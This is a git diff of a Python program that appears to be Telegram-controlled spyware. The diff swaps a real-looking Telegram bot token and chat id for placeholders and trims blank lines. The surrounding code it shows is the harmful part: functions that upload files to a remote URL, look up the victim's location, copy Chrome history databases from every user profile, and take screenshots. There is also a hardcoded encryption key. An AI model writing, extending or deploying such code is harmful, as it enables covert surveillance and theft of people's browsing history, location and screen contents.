@@ -26,8 +26,8 @@ key_crypt=b'64anpQ1F__rHalgTiLjqVNcf7TyirzwEqGJQM3fKAC8='
 telegram_token = 'Your telegram bot token'
 chat_id = 'chat id'
 
-telegram_token = '5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho'
-chat_id = '-791347020'
+telegram_token = 'Your telegram token.'
+chat_id = 'Chat id.'
 keys=[]
 count=0
 
@@ -102,8 +102,6 @@ def upload_files(url,file):
             return "upload failed.. "
 
 
-
-
 def get_current_location():
     url = "https://mylocation.org/"
     html = urlopen(url).read()
@@ -131,8 +129,6 @@ def get_current_location():
     return res
 
 
-
-
 def histoty_chrome(num):
     p = subprocess.Popen('chdir C:\\Process\\ && mkdir sih', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     all_files = [f for f in listdir('C:\\Process\\sih') if isfile(join('C:\\Process\\sih', f))]
@@ -144,8 +140,6 @@ def histoty_chrome(num):
     except:
         num = 'all'
     username=os.getlogin()
-            
-            
     possible_folders=['Guest Profile','Default']
     for i in os.listdir("C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data"):
         if 'Profile ' in i:
@@ -156,8 +150,6 @@ def histoty_chrome(num):
         files=open("C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data\\"+i+"\\History",'rb')
         with open("C:\\Process\\sih\\sih_file", 'wb')as file:
             file.write(files.read())
-
-        
 
         history_db = ("C:\\Process\\sih\\sih_file")
         c = sqlite3.connect(history_db)
@@ -188,8 +180,6 @@ def histoty_chrome(num):
         data=''
         res_path.append('C:\\Process\\sih\\'+i+'.txt')
     return res_path
-     
-        
 
 
 def screen_shot(name):
